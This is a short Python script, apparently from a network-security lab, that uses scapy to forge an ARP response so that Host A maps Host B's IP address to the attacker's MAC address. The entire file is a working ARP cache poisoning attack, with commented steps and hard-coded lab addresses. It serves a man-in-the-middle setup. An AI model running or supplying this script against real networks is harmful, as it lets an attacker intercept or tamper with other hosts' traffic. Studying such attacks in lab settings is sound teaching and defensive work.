#!/usr/bin/python3

from scapy.all import *

"""
Create ARP poison packet using ARP response
"""
# Declare constants
hostA_IP = "10.0.2.5"
hostA_MAC_addr = "08:00:27:a7:99:df"
hostB_IP = "10.0.2.6"
attacker_MAC_addr = "08:00:27:58:67:fa"
arp_response_code = 2 # ARP response

# Create the Ethernet instance
E = Ether()
# Set the Ethernet frame destination MAC address to Host A MAC address
E.dst = hostA_MAC_addr
# Set the Ethernet frame source MAC address to attacker MAC address
E.src = attacker_MAC_addr

# Create the ARP packet instance
A = ARP()
# 1. Change the source IP address to the Host B IP address
# 2. Change the destionation IP address to Host A IP address
# 3. Change the source MAC address to attacker MAC address
# 4. Change the destination MAC address to Host A MAC address
# 5. Set the ARP opcode to 2 (response)
A.psrc = hostB_IP
A.pdst = hostA_IP
A.hwsrc = attacker_MAC_addr
A.hwdst = hostA_MAC_addr
A.op = arp_response_code

# Create ARP packet instance
pkt = E/A

# Send ARP packet
sendp(pkt)
